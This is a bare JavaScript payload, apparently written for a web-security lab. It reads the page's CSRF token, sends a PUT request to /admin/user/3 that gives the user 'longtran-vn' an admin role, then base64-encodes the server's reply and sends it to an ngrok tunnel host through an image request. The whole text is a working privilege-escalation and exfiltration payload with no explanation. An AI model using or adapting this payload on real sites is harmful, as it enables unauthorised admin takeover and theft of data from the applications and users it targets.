fetch('/admin/user/3', {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
    },
    body: JSON.stringify({
        username: "longtran-vn",
        email: "longtran-vn@lab1.demo",
        role: "admin-role"
    })
})
.then(r => r.text())
.then(d => {
    new Image().src = "https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app/?res=" + btoa(d)
});
